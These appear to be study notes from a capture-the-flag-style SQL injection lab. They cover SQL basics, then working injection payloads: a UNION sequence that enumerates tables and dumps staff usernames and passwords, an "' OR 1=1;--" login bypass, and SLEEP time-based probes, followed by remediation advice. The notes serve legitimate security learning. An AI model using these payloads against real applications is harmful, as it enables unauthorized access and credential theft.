# SQL Injection
SQL (Structured Query Language) injection, most commonly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed.

### Task 2 What is a database?
A way of electronically storing collections of data in an organized manner. DBMS (Database Management System), can be either **Relational** or **Non-relational**. Examples include MySQL, Microsoft SQL Server, Access, PostgreSQL, and SQLite.

##### Relational vs. non-relational DBs
A relational database, stores information in tables and often tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and cause a relationship between the tables, hence the name **relational** database.

Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database. Some popular ones are MongoDB, Cassandra and ElasticSearch.

### Task 3 What is SQL?
Structured Query Language is a feature-rich language used for querying databases, these SQL queries are better referred to as statements.

The simplest of the commands include retrieve (select), update, insert and delete data.

**SELECT**
Retrieves data from the database

`select * from users;`

Retrieves all data from the table called users.

`select username,password from users;`

Retrieves the columns username and password only from the table users.

`select * from users LIMIT 1;`

The LIMIT 1 clause forces the database to only return one row of data. A variation is LIMIT 1,1 which will skip the first row and return the next row, or LIMIT 2,1 will skip the first two rows and then return the third row only.

`select * from users where username='admin';`

Returns only the data from the users table where the username is 'admin'

`select * from users where username != 'admin';`

Returns all data where the username does NOT equal admin.

`select * from users where username='admin' or username='jon'`

Only usernames that equal admin or jon

`select * from users where username='admin' and password='p4ssword';`

Returns where the username is admin and the password equals p4ssword

`select * from users where username like 'a%';`

Returns any rows with username beginning with the letter a.

`select * from users where username like '%n';`

Returns any rows with username ending with the letter n.

`select * from users where username like '%mi%';`

Returns any rows where the username contains 'mi' within them

**UNION**
Combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of similar data type and the column order has to be the same.

`SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;`

Returns the information from both.

**INSERT**
Tells the database we wish to insert a new row of data into the table. **"into users"** tells the database which table we wish to insert the data into, **"(username, password)"** tells which columns we are providing data for then **"values ('bob','password');"**  provides the data for the previously specified columns.

`INSERT into users (username,password) values ('bob','password123');`

**UPDATE**
Tells the database we wish to update one or more rows of data within a table. you specify the table you wish to update using **"update %tablename% SET"** and then select the field or fields you wish to update as a comma-separated list such as **"username='root',password='pass123'"** then finally something similar to SELECT statement, you can specify exactly which rows to update using the where clause such as **"where username='admin';"**

`UPDATE users SET username='root',password='pass123' WHERE username='admin';`

**DELETE**
Tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to SELECT. You can specify precisely which data to delete using the **where** clause and the number of rows to be deleted using the **LIMIT** clause.

`DELETE from users WHERE username='martin';`

`DELETE from users;`
Deletes the entire users table

### Task 4 What is SQL Injection?
Happens when user-provided data gets included in the SQL query for an application

**What does it look like?**
Example scenario below, an online blog and each blog entry has a unique id number. The blog entreis may be either set to public or private depending on whether they're ready for public release. The URL for each blog entry may look something like

`https://website.thm/blog?id=1`

You can assume the query looks something like

`SELECT * from blog WHERE id=1 and private=0 LIMIT 1`

### Task 5 In-Band SQLi
Easiest type to detect and exploit; refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example injecting SQL on a webpage and then being able to extract data from the database to the same page.

**Error-based**
Most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.

**Union-based**
Using the UNION operator alongside SELECT to return additional results to the page.

The key to discovering error-based SQL injection is to break the code's SQL query by trying certain characters until an error message is produced; most commonly single quotes or a quotation mark

**Practical**
Throwing in a `"` causes an error in the query. Then trying with UNION

```sql
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3 -> the right amount of columns
0 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database() -> sqli_one db name
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' -> returns (article,staff_users)
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users' -> id,password,username
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

The **group_concat()** gets the specified column (in this case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is **information_schema** database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. This query lists all the tables in the **sqli_one** table.

### Task 6 Blind SQLi - Authentication Bypass
Unlike In-band SQLi, in blind SQLi we can't see the output from the query we're trying to manipulate.

**Authentication Bypass**
One of the most straightforward Blind SQLi techniques is when bypassing authentication methods such as login forms.

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table.

Test out using in password field
`' OR 1=1;--`

will end the quote in the password clause and then `OR 1=1` will always be true. The semicolon ends the statement and two dashes comment the rest of the line out.

### Task 7 Blind SQLi - Boolean Based
Refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL injection payload was either successful or not. on the first inspection, you may feel like this limited response can't tell us much but it does

### Task 8 Blind SQLi - Time based
A time-based blind SQLi is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as **SLEEP(x)** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.

Example
`admin123' UNION SELECT SLEEP(5);--`

If there was no pause in response time, we know that the query was unsuccessful

`admin123' UNION SELECT SLEEP(5),2;--`

### Task 9 Out-of-Band SQLi
Isn't common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of externa network call based on the results from a SQL query.

ex)

1. An attacker makes a request to a website vulnerable to SQL injection with an injection payload
2. The website makes a SQL query to the database which also passes the hacker's payload
3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

### Task 10 Remediation
- Prepared statements (with parameterized queries)
- Input validation
- Escaping user input

